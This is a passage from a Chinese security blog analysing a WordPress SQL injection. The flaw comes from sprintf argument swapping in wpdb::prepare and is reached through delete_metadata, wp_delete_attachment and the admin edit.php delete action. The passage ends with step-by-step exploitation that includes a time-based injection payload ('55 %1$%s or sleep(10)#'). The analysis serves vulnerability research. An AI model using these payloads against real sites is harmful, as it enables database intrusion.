class="keyword">return</span> (bool) $check;</div><div class="line">	$_meta_value = $meta_value;</div><div class="line">	$meta_value = maybe_serialize( $meta_value );</div><div class="line">	$query = $wpdb-&gt;prepare( <span class="string">"SELECT $id_column FROM $table WHERE meta_key = %s"</span>, $meta_key );</div><div class="line">	<span class="keyword">if</span> ( !$delete_all )</div><div class="line">		$query .= $wpdb-&gt;prepare(<span class="string">" AND $type_column = %d"</span>, $object_id );</div><div class="line">	<span class="keyword">if</span> ( <span class="string">''</span> !== $meta_value &amp;&amp; <span class="keyword">null</span> !== $meta_value &amp;&amp; <span class="keyword">false</span> !== $meta_value )</div><div class="line">		$query .= $wpdb-&gt;prepare(<span class="string">" AND meta_value = %s"</span>, $meta_value );</div><div class="line">	$meta_ids = $wpdb-&gt;get_col( $query );</div><div class="line">	<span class="keyword">if</span> ( !count( $meta_ids ) )</div><div class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">	<span class="keyword">if</span> ( $delete_all ) &#123;</div><div class="line">		$value_clause = <span class="string">''</span>;</div><div class="line">		<span class="keyword">if</span> ( <span class="string">''</span> !== $meta_value &amp;&amp; <span class="keyword">null</span> !== $meta_value &amp;&amp; <span class="keyword">false</span> !== $meta_value ) &#123;</div><div class="line">=&gt;			$value_clause = $wpdb-&gt;prepare( <span class="string">" AND meta_value = %s"</span>, $meta_value );</div><div class="line">		&#125;</div><div class="line">=&gt;		$object_ids = $wpdb-&gt;get_col( $wpdb-&gt;prepare( <span class="string">"SELECT $type_column FROM $table WHERE meta_key = %s $value_clause"</span>, $meta_key ) );</div><div class="line">	&#125;</div><div class="line">	...<span class="comment">//ignore</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>我们来看下关键部分代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ( $delete_all ) &#123;</div><div class="line">	$value_clause = <span class="string">''</span>;</div><div class="line">	<span class="keyword">if</span> ( <span class="string">''</span> !== $meta_value &amp;&amp; <span class="keyword">null</span> !== $meta_value &amp;&amp; <span class="keyword">false</span> !== $meta_value ) &#123;</div><div class="line">=&gt;		$value_clause = $wpdb-&gt;prepare( <span class="string">" AND meta_value = %s"</span>, $meta_value );</div><div class="line">	&#125;</div><div class="line">=&gt;	$object_ids = $wpdb-&gt;get_col( $wpdb-&gt;prepare( <span class="string">"SELECT $type_column FROM $table WHERE meta_key = %s $value_clause"</span>, $meta_key ) );</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>按我们上一篇文章的分析，若<code>$meta_value</code>可控，此处就存在SQL注入漏洞。而<code>$meta_value</code>变量是作为参数从外部传进来的，所以我们需要查找调用到delete_metadata函数，且第四个参数可控的地方。</p>
+<p>我们此处直接选用<a href="https://medium.com/@slavco" target="_blank" rel="external">@slavco</a><a href="https://medium.com/websec/wordpress-sqli-bbb2afcc8e94" target="_blank" rel="external">文章</a>中的wp_delete_attachment函数（文件：<a href="https://github.com/WordPress/WordPress/blob/bbb8d48086b7d10908f4fda673585ee122f2851d/wp-includes/post.php#L4864" target="_blank" rel="external">/wp-includes/post.php</a>），代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_delete_attachment</span><span class="params">( $post_id, $force_delete = false )</span> </span>&#123;</div><div class="line">	<span class="keyword">global</span> $wpdb;</div><div class="line">	<span class="keyword">if</span> ( !$post = $wpdb-&gt;get_row( $wpdb-&gt;prepare(<span class="string">"SELECT * FROM $wpdb-&gt;posts WHERE ID = %d"</span>, $post_id) ) )</div><div class="line">		<span class="keyword">return</span> $post;</div><div class="line">	<span class="keyword">if</span> ( <span class="string">'attachment'</span> != $post-&gt;post_type )</div><div class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">	<span class="keyword">if</span> ( !$force_delete &amp;&amp; EMPTY_TRASH_DAYS &amp;&amp; MEDIA_TRASH &amp;&amp; <span class="string">'trash'</span> != $post-&gt;post_status )</div><div class="line">		<span class="keyword">return</span> wp_trash_post( $post_id );</div><div class="line">	delete_post_meta($post_id, <span class="string">'_wp_trash_meta_status'</span>);</div><div class="line">	delete_post_meta($post_id, <span class="string">'_wp_trash_meta_time'</span>);</div><div class="line">	$meta = wp_get_attachment_metadata( $post_id );</div><div class="line">	$backup_sizes = get_post_meta( $post-&gt;ID, <span class="string">'_wp_attachment_backup_sizes'</span>, <span class="keyword">true</span> );</div><div class="line">	$file = get_attached_file( $post_id );</div><div class="line">	<span class="keyword">if</span> ( is_multisite() )</div><div class="line">		delete_transient( <span class="string">'dirsize_cache'</span> );</div><div class="line"></div><div class="line">	do_action( <span class="string">'delete_attachment'</span>, $post_id );</div><div class="line">	wp_delete_object_term_relationships($post_id, <span class="keyword">array</span>(<span class="string">'category'</span>, <span class="string">'post_tag'</span>));</div><div class="line">	wp_delete_object_term_relationships($post_id, get_object_taxonomies($post-&gt;post_type));</div><div class="line">	<span class="comment">// Delete all for any posts.</span></div><div class="line">=&gt;	delete_metadata( <span class="string">'post'</span>, <span class="keyword">null</span>, <span class="string">'_thumbnail_id'</span>, $post_id, <span class="keyword">true</span> );</div><div class="line">	...<span class="comment">//ignore</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>关键代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">delete_metadata( <span class="string">'post'</span>, <span class="keyword">null</span>, <span class="string">'_thumbnail_id'</span>, $post_id, <span class="keyword">true</span> );</div></pre></td></tr></table></figure>
+<p>里面的$post_id同样从外部传入，所以我们继续查找调用到wp_delete_attachment函数，且第一个参数可控的地方。</p>
+<p>在文件<a href="https://github.com/WordPress/WordPress/blob/bbb8d48086b7d10908f4fda673585ee122f2851d/wp-admin/edit.php#L143" target="_blank" rel="external">/wp-admin/edit.php</a>中有个比较明显的调用点，且$post_id（即：wp_delete_attachment函数的第一个参数）可控。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> <span class="string">'delete'</span>:</div><div class="line">	$deleted = <span class="number">0</span>;</div><div class="line">	<span class="keyword">foreach</span> ( (<span class="keyword">array</span>) $post_ids <span class="keyword">as</span> $post_id ) &#123;</div><div class="line">		$post_del = get_post($post_id);</div><div class="line">		<span class="keyword">if</span> ( !current_user_can( <span class="string">'delete_post'</span>, $post_id ) )</div><div class="line">			wp_die( __(<span class="string">'Sorry, you are not allowed to delete this item.'</span>) );</div><div class="line">		<span class="keyword">if</span> ( $post_del-&gt;post_type == <span class="string">'attachment'</span> ) &#123;</div><div class="line">=&gt;			<span class="keyword">if</span> ( ! wp_delete_attachment($post_id) )</div><div class="line">				wp_die( __(<span class="string">'Error in deleting.'</span>) );</div><div class="line">		&#125; <span class="keyword">else</span> &#123;</div><div class="line">			<span class="keyword">if</span> ( !wp_delete_post($post_id) )</div><div class="line">				wp_die( __(<span class="string">'Error in deleting.'</span>) );</div><div class="line">		&#125;</div><div class="line">		$deleted++;</div><div class="line">	&#125;</div><div class="line">	$sendback = add_query_arg(<span class="string">'deleted'</span>, $deleted, $sendback);</div><div class="line">	<span class="keyword">break</span>;</div></pre></td></tr></table></figure></p>
+<h3 id="3-2-利用条件分析"><a href="#3-2-利用条件分析" class="headerlink" title="3.2 利用条件分析"></a>3.2 利用条件分析</h3><p>我们首先简单地整理下相关文件/函数的调用过程与调用条件。</p>
+<p><strong>1. 文件：<a href="https://github.com/WordPress/WordPress/blob/bbb8d48086b7d10908f4fda673585ee122f2851d/wp-admin/edit.php#L143" target="_blank" rel="external">/wp-admin/edit.php</a></strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">...<span class="comment">//ignore</span></div><div class="line">$doaction = $wp_list_table-&gt;current_action();</div><div class="line"><span class="keyword">if</span> ( $doaction ) &#123;</div><div class="line">	check_admin_referer(<span class="string">'bulk-posts'</span>);</div><div class="line">	...<span class="comment">//ignore</span></div><div class="line">	&#125; <span class="keyword">elseif</span> ( <span class="keyword">isset</span>( $_REQUEST[<span class="string">'media'</span>] ) ) &#123;</div><div class="line">		$post_ids = $_REQUEST[<span class="string">'media'</span>];</div><div class="line">	&#125; <span class="keyword">elseif</span> ( <span class="keyword">isset</span>( $_REQUEST[<span class="string">'ids'</span>] ) ) &#123;</div><div class="line">		$post_ids = explode( <span class="string">','</span>, $_REQUEST[<span class="string">'ids'</span>] );</div><div class="line">	&#125; <span class="keyword">elseif</span> ( !<span class="keyword">empty</span>( $_REQUEST[<span class="string">'post'</span>] ) ) &#123;</div><div class="line">		$post_ids = array_map(<span class="string">'intval'</span>, $_REQUEST[<span class="string">'post'</span>]);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">if</span> ( !<span class="keyword">isset</span>( $post_ids ) ) &#123;</div><div class="line">		wp_redirect( $sendback );</div><div class="line">		<span class="keyword">exit</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">switch</span> ( $doaction ) &#123;</div><div class="line">		...<span class="comment">//ignore</span></div><div class="line">		<span class="keyword">case</span> <span class="string">'delete'</span>:</div><div class="line">			$deleted = <span class="number">0</span>;</div><div class="line">			<span class="keyword">foreach</span> ( (<span class="keyword">array</span>) $post_ids <span class="keyword">as</span> $post_id ) &#123;</div><div class="line">				$post_del = get_post($post_id);</div><div class="line">				<span class="keyword">if</span> ( !current_user_can( <span class="string">'delete_post'</span>, $post_id ) )</div><div class="line">					wp_die( __(<span class="string">'Sorry, you are not allowed to delete this item.'</span>) );</div><div class="line">				<span class="keyword">if</span> ( $post_del-&gt;post_type == <span class="string">'attachment'</span> ) &#123;</div><div class="line">					<span class="keyword">if</span> ( ! wp_delete_attachment($post_id) )</div><div class="line">						wp_die( __(<span class="string">'Error in deleting.'</span>) );</div><div class="line">				&#125; <span class="keyword">else</span> &#123;</div><div class="line">					<span class="keyword">if</span> ( !wp_delete_post($post_id) )</div><div class="line">						wp_die( __(<span class="string">'Error in deleting.'</span>) );</div><div class="line">				&#125;</div><div class="line">				$deleted++;</div><div class="line">			&#125;</div><div class="line">			...<span class="comment">//ignore</span></div></pre></td></tr></table></figure>
+<p><strong>需满足条件：</strong></p>
+<ul>
+<li><strong>$doaction = $wp_list_table-&gt;current_action() = ‘delete’</strong><br>  即：$_REQUEST[‘action’] = ‘delete’</li>
+<li><strong>通过check_admin_referer(‘bulk-posts’)</strong><br>  检查$_REQUEST[‘_wpnonce’]</li>
+<li><strong>$post_ids = $_REQUEST[‘media’] = ‘%1$%s abc’</strong><br>  传入测试注入字符串</li>
+<li><strong>current_user_can( ‘delete_post’, $post_id ) == true</strong><br>  当前用户是否有删除该文章权限</li>
+<li><strong>$post_del-&gt;post_type == ‘attachment’</strong><br>  该文章类型为attachment，可通过添加媒体功能添加</li>
+</ul>
+<p><strong>2. 文件：<a href="https://github.com/WordPress/WordPress/blob/bbb8d48086b7d10908f4fda673585ee122f2851d/wp-includes/post.php#L4864" target="_blank" rel="external">/wp-includes/post.php</a></strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">...<span class="comment">//ignore</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_delete_attachment</span><span class="params">( $post_id, $force_delete = false )</span> </span>&#123;</div><div class="line">	<span class="keyword">global</span> $wpdb;</div><div class="line">	<span class="keyword">if</span> ( !$post = $wpdb-&gt;get_row( $wpdb-&gt;prepare(<span class="string">"SELECT * FROM $wpdb-&gt;posts WHERE ID = %d"</span>, $post_id) ) )</div><div class="line">		<span class="keyword">return</span> $post;</div><div class="line">	<span class="keyword">if</span> ( <span class="string">'attachment'</span> != $post-&gt;post_type )</div><div class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">	<span class="keyword">if</span> ( !$force_delete &amp;&amp; EMPTY_TRASH_DAYS &amp;&amp; MEDIA_TRASH &amp;&amp; <span class="string">'trash'</span> != $post-&gt;post_status )</div><div class="line">		<span class="keyword">return</span> wp_trash_post( $post_id );</div><div class="line">	...<span class="comment">//ignore</span></div><div class="line">	delete_metadata( <span class="string">'post'</span>, <span class="keyword">null</span>, <span class="string">'_thumbnail_id'</span>, $post_id, <span class="keyword">true</span> );</div><div class="line">...<span class="comment">//ignore</span></div></pre></td></tr></table></figure>
+<p><strong>需满足条件：</strong></p>
+<ul>
+<li><strong>$post_id对应的文章存在</strong><br>  因为有类型转换，所以可以用<code>$post_id = &#39;123 %1$%s abc&#39;</code>绕过。（转换为整数后<code>$post_id = 123</code>）</li>
+<li><strong>$post_id对应的文章类型为attachment</strong></li>
+</ul>
+<p><strong>3. 文件：<a href="https://github.com/WordPress/WordPress/blob/bbb8d48086b7d10908f4fda673585ee122f2851d/wp-includes/meta.php#L307" target="_blank" rel="external">/wp-includes/meta.php</a></strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">...<span class="comment">//ignore</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">delete_metadata</span><span class="params">($meta_type, $object_id, $meta_key, $meta_value = <span class="string">''</span>, $delete_all = false)</span> </span>&#123;</div><div class="line">	<span class="keyword">global</span> $wpdb;</div><div class="line">	<span class="keyword">if</span> ( ! $meta_type || ! $meta_key || ! is_numeric( $object_id ) &amp;&amp; ! $delete_all ) &#123;</div><div class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">	&#125;</div><div class="line">	...<span class="comment">//ignore</span></div><div class="line">	$meta_key = wp_unslash($meta_key);</div><div class="line">	$meta_value = wp_unslash($meta_value);</div><div class="line"></div><div class="line">	$check = apply_filters( <span class="string">"delete_&#123;$meta_type&#125;_metadata"</span>, <span class="keyword">null</span>, $object_id, $meta_key, $meta_value, $delete_all );</div><div class="line">	<span class="keyword">if</span> ( <span class="keyword">null</span> !== $check )</div><div class="line">		<span class="keyword">return</span> (bool) $check;</div><div class="line">	$_meta_value = $meta_value;</div><div class="line">	$meta_value = maybe_serialize( $meta_value );</div><div class="line">	$query = $wpdb-&gt;prepare( <span class="string">"SELECT $id_column FROM $table WHERE meta_key = %s"</span>, $meta_key );</div><div class="line">	<span class="keyword">if</span> ( !$delete_all )</div><div class="line">		$query .= $wpdb-&gt;prepare(<span class="string">" AND $type_column = %d"</span>, $object_id );</div><div class="line">	<span class="keyword">if</span> ( <span class="string">''</span> !== $meta_value &amp;&amp; <span class="keyword">null</span> !== $meta_value &amp;&amp; <span class="keyword">false</span> !== $meta_value )</div><div class="line">		$query .= $wpdb-&gt;prepare(<span class="string">" AND meta_value = %s"</span>, $meta_value );</div><div class="line">	$meta_ids = $wpdb-&gt;get_col( $query );</div><div class="line">	<span class="keyword">if</span> ( !count( $meta_ids ) )</div><div class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">	<span class="keyword">if</span> ( $delete_all ) &#123;</div><div class="line">		$value_clause = <span class="string">''</span>;</div><div class="line">		<span class="keyword">if</span> ( <span class="string">''</span> !== $meta_value &amp;&amp; <span class="keyword">null</span> !== $meta_value &amp;&amp; <span class="keyword">false</span> !== $meta_value ) &#123;</div><div class="line">			$value_clause = $wpdb-&gt;prepare( <span class="string">" AND meta_value = %s"</span>, $meta_value );</div><div class="line">		&#125;</div><div class="line">		$object_ids = $wpdb-&gt;get_col( $wpdb-&gt;prepare( <span class="string">"SELECT $type_column FROM $table WHERE meta_key = %s $value_clause"</span>, $meta_key ) );</div><div class="line">	&#125;</div><div class="line">...<span class="comment">//ignore</span></div></pre></td></tr></table></figure>
+<p><strong>需满足条件：</strong></p>
+<ul>
+<li><strong>“SELECT meta_id FROM wp_postmeta WHERE meta_key = ‘_thumbnail_id’ AND meta_value = ‘xxx’”存在</strong><br>  即：需要使得wp_postmeta表内的_thumbnail_id的内容与我们的SQL语句一样（即内容为’123 %2$%s abc’）。</li>
+</ul>
+<p><strong>wp_postmeta表内的meta_key和meta_value字段是可通过<code>写文章</code>功能内的<code>自定义栏目</code>添加的。但是禁止添加名称以<code>下划线</code>开头的自定义栏目，所以正常情况下我们无法添加_thumbnail_id栏目。</strong></p>
+<p>关于如果绕过<code>下划线</code>检查添加post meta，请见下一篇文章：</p>
+<ul>
+<li><a href="/2017/09/05/Wordpress-POST-META-Check-Bypass/">Wordpress POST META_NAME校验绕过</a></li>
+</ul>
+<h3 id="3-3-SQL注入漏洞利用"><a href="#3-3-SQL注入漏洞利用" class="headerlink" title="3.3 SQL注入漏洞利用"></a>3.3 SQL注入漏洞利用</h3><ol>
+<li>添加媒体（/wp-admin/media-new.php），并记住媒体ID（这里的ID是55）。</li>
+</ol>
+<img src="/2017/09/03/Wordpress-SQL-Injection-Analysis-2/4.1.1.png" alt="添加媒体" title="添加媒体">
+<ol>
+<li>获取_wpnonce。<br>打开<code>/wp-admin/edit.php?post_type=post</code>，找到posts-filter内的_wpnonce（这里的_wpnonce是301ee97c09）</li>
+</ol>
+<img src="/2017/09/03/Wordpress-SQL-Injection-Analysis-2/4.2.1.png" alt="添加媒体" title="添加媒体">
+<ol>
+<li><p>添加/修改POST META，使存在meta_key为’_thumbnail_id’的meta_value为<code>&#39;55 %1$%s or sleep(10)#&#39;</code></p>
+</li>
+<li><p>访问<code>/wp-admin/edit.php?action=delete&amp;_wpnonce=301ee97c09&amp;ids=55 %1$%s or sleep(10)#</code>，触发SQL注入漏洞</p>
+</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.vulspy.com/2017/09/03/Wordpress-SQL-Injection-Analysis-2/" data-id="cj9y5qhhk0007lqpva9rs7qu0" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞分析/">漏洞分析</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-Wordpress-SQL-Injection-Analysis-1" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/09/02/Wordpress-SQL-Injection-Analysis-1/" class="article-date">
+  <time datetime="2017-09-01T16:50:59.000Z" itemprop="datePublished">2017-09-02</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/09/02/Wordpress-SQL-Injection-Analysis-1/">Wordpress SQL注入分析（一）</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>作者：Ambulong@vulspy</p>
+<ul>
+<li><a href="/2017/09/02/Wordpress-SQL-Injection-Analysis-1/">Wordpress SQL注入分析（一）</a></li>
+<li><a href="/2017/09/03/Wordpress-SQL-Injection-Analysis-2/">Wordpress SQL注入分析（二）</a></li>
+</ul>
+<h2 id="第一章-sprintf-vsprintf-中的-argument-numbering-swapping"><a href="#第一章-sprintf-vsprintf-中的-argument-numbering-swapping" class="headerlink" title="第一章: sprintf/vsprintf 中的 argument numbering/swapping"></a>第一章: sprintf/vsprintf 中的 argument numbering/swapping</h2><h3 id="1-1-函数间的区别"><a href="#1-1-函数间的区别" class="headerlink" title="1.1 函数间的区别"></a>1.1 函数间的区别</h3><p>在PHP中，我们主要通过sprintf函数和vsprintf函数来格式化字符串，同时会对参数进行类型的转换。这两个函数的区别在于sprintf函数在第一个参数之后可接收多个不同类型参数，vsprintf的第一个参数之后只接收一个数组参数（即：第二个参数只能是数组）。</p>
+<p><strong>sprintf函数</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">string sprintf ( string $format [, mixed $args [, mixed $... ]] )</div></pre></td></tr></table></figure></p>
+<p><strong>vsprintf函数</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">string vsprintf ( string $format , <span class="keyword">array</span> $args )</div></pre></td></tr></table></figure></p>
+<h3 id="1-2-format参数"><a href="#1-2-format参数" class="headerlink" title="1.2 format参数"></a>1.2 format参数</h3><p>sprintf/vsprintf函数的第一个参数$format指定了如何格式化后面的参数。<br>常见的格式化类型如下：</p>
+<table>
+<thead>
+<tr>
+<th>标识</th>
+<th>类型</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>%s</td>
+<td>字符串</td>
+</tr>
+<tr>
+<td>%d</td>
+<td>整数</td>
+</tr>
+<tr>
+<td>%f</td>
+<td>浮点数</td>
+</tr>
+</tbody>
+</table>
+<p>以下两个例子的输出结果是一样的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//例一</span></div><div class="line"><span class="keyword">echo</span> sprintf(<span class="string">"str:%s int:%d float:%f"</span>, <span class="string">'123.123aa'</span>, <span class="string">'123.123aa'</span>, <span class="string">'123.123aa'</span>);</div><div class="line"><span class="comment">//例二</span></div><div class="line"><span class="keyword">echo</span> vsprintf(<span class="string">"str:%s int:%d float:%f"</span>, <span class="keyword">array</span>(<span class="string">'123.123aa'</span>, <span class="string">'123.123aa'</span>, <span class="string">'123.123aa'</span>));</div></pre></td></tr></table></figure>
+<p>输出结果:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">str:123.123aa int:123 float:123.123000</div></pre></td></tr></table></figure></p>
+<h3 id="1-3-format参数延伸"><a href="#1-3-format参数延伸" class="headerlink" title="1.3 format参数延伸"></a>1.3 format参数延伸</h3><p><strong>sprintf/vsprintf函数还可以用来将字符串自动补位</strong>，如:</p>
+<p>例一：”123”用0补齐5位变成”00123”:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">echo</span> sprintf(<span class="string">"%05d"</span>, <span class="string">'123'</span>);</div></pre></td></tr></table></figure></p>
+<p>0表示要补上的数字为0，5表示的是位数，d表示类型为整数。</p>
+<p>例二：”123”用.补齐5位变成”..123”:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">echo</span> sprintf(<span class="string">"%'.5d"</span>, <span class="string">'123'</span>);</div></pre></td></tr></table></figure></p>
+<p>‘.表示要补上的字符为。(字符需要加上’)，5表示的是位数，d表示类型为整数。</p>
+<p><em>需要了解更多关于format的描述，请参见 <a href="http://php.net/manual/zh/function.vsprintf.php" target="_blank" rel="external">sprintf()</a></em></p>
+<p><strong>Argument numbering/swapping</strong></p>
+<p>sprintf/vsprintf的格式化字符串支持<strong>Argument numbering/swapping</strong>（中文直译：参数交换），即可以指定格式化标识表示的是第几个参数。<br>例一：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">echo</span> sprintf(<span class="string">'%2$s %3$s %1$s'</span>, <span class="string">'a1'</span>, <span class="string">'a2'</span>, <span class="string">'a3'</span>);</div><div class="line"><span class="comment">//输出：a2 a3 a1</span></div></pre></td></tr></table></figure></p>
+<p>例二：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">echo</span> sprintf(<span class="string">'%s %s %1$s'</span>, <span class="string">'a1'</span>, <span class="string">'a2'</span>, <span class="string">'a3'</span>);</div><div class="line"><span class="comment">//输出：a1 a2 a1</span></div></pre></td></tr></table></figure></p>
+<p>例三：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">echo</span> sprintf(<span class="string">'%s %s %1$\'.5s'</span>, <span class="string">'a1'</span>, <span class="string">'a2'</span>, <span class="string">'a3'</span>);</div><div class="line"><span class="comment">//输出：a1 a2 ...a1</span></div></pre></td></tr></table></figure></p>
+<p><em>注：Chapter 1由<a href="http://blog.vulspy.com/">@Ambulong</a>与<a href="http://yqxiaojunjie.com/" target="_blank" rel="external">@乐清小俊杰</a>共同完成。</em></p>
+<h2 id="第二章-wpdb类中的prepare-函数"><a href="#第二章-wpdb类中的prepare-函数" class="headerlink" title="第二章: wpdb类中的prepare()函数"></a>第二章: wpdb类中的prepare()函数</h2><p>在Wordpress的数据库操作类wpdb(文件: <a href="https://github.com/WordPress/WordPress/blob/bbb8d48086b7d10908f4fda673585ee122f2851d/wp-includes/wp-db.php#L1228" target="_blank" rel="external">/wp-includes/wp-db.php</a>)中有一个prepare()函数，该函数主要用来对将要执行SQL语句进行预处理，如：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$wpdb-&gt;prepare( <span class="string">"SELECT * FROM `table` WHERE `column` = %s AND `field` = %d"</span>, <span class="string">'foo'</span>, <span class="number">1337</span> );</div></pre></td></tr></table></figure></p>
+<p>以上例子将会返回下列字符串:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="string">`table`</span> <span class="keyword">WHERE</span> <span class="string">`column`</span> = <span class="string">'foo'</span> <span class="keyword">AND</span> <span class="string">`field`</span> = <span class="number">1337</span><span class="string">"</span></div></pre></td></tr></table></figure></p>
+<p>但是该函数没有并没有对传入的$query参数进行严格的过滤，如果$query参数内容或部分内容可控，就可能导致SQL注入。</p>
+<p>prepare函数的代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">prepare</span><span class="params">( $query, $args )</span> </span>&#123;</div><div class="line">	<span class="keyword">if</span> ( is_null( $query ) )</div><div class="line">		<span class="keyword">return</span>;</div><div class="line"></div><div class="line">	<span class="comment">// This is not meant to be foolproof -- but it will catch obviously incorrect usage.</span></div><div class="line">	<span class="keyword">if</span> ( strpos( $query, <span class="string">'%'</span> ) === <span class="keyword">false</span> ) &#123;</div><div class="line">		_doing_it_wrong( <span class="string">'wpdb::prepare'</span>, sprintf( __( <span class="string">'The query argument of %s must have a placeholder.'</span> ), <span class="string">'wpdb::prepare()'</span> ), <span class="string">'3.9.0'</span> );</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	$args = func_get_args();</div><div class="line">	array_shift( $args );</div><div class="line">	<span class="comment">// If args were passed as an array (as in vsprintf), move them up</span></div><div class="line">	<span class="keyword">if</span> ( <span class="keyword">isset</span>( $args[<span class="number">0</span>] ) &amp;&amp; is_array($args[<span class="number">0</span>]) )</div><div class="line">		$args = $args[<span class="number">0</span>];</div><div class="line">	$query = str_replace( <span class="string">"'%s'"</span>, <span class="string">'%s'</span>, $query ); <span class="comment">// in case someone mistakenly already singlequoted it</span></div><div class="line">	$query = str_replace( <span class="string">'"%s"'</span>, <span class="string">'%s'</span>, $query ); <span class="comment">// doublequote 